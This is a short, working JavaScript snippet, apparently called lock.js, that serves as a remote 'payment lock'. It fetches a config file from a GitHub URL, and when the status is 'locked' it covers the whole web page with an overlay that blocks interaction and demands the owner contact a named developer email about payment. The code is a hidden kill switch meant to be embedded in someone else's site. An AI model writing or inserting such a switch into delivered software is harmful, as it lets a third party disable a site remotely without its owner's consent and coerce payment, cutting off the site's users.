(async function(){
  try{
    const cfgUrl = "https://raw.githubusercontent.com/YOUR/REPO/main/project-config.json"; // your config URL
    const res = await fetch(cfgUrl + "?t=" + Date.now(), {cache: "no-cache"});
    if(!res.ok) return;
    const cfg = await res.json();
    if(cfg.project_status === "locked"){
      const overlay = document.createElement("div");
      overlay.id = "payment-lock-overlay";
      Object.assign(overlay.style, {
        position: "fixed",
        inset: "0",
        background: "rgba(0,0,0,0.92)",
        color: "#fff",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        zIndex: "2147483647",
        textAlign: "center",
        padding: "24px",
        fontFamily: "system-ui, sans-serif"
      });
      const box = document.createElement("div");
      box.style.maxWidth = "720px";
      box.style.padding = "28px";
      box.style.borderRadius = "12px";
      box.style.background = "rgba(255,255,255,0.03)";
      box.style.color = "#fff";
      const h = document.createElement("h2");
      h.textContent = cfg.title || "Access paused — payment required";
      h.style.margin = "0 0 12px 0"; h.style.fontSize = "22px";
      const p = document.createElement("p");
      p.textContent = cfg.message || "Please contact the developer to restore access.";
      p.style.margin = "0 0 18px 0";
      const btn = document.createElement("a");
      btn.textContent = "Contact Developer";
      btn.href = "mailto:felixhosea61@gmail.com?subject=Project%20Access%20Payment";
      Object.assign(btn.style, {display:"inline-block",padding:"10px 18px",background:"#10b981",color:"#fff",borderRadius:"8px",textDecoration:"none",fontWeight:"600"});
      box.appendChild(h); box.appendChild(p); box.appendChild(btn);
      overlay.appendChild(box);
      document.documentElement.appendChild(overlay);
      // Prevent interaction with page
      document.documentElement.setAttribute("aria-hidden", "true");
    }
  }catch(err){
    console.warn("lock.js error", err);
  }
})();
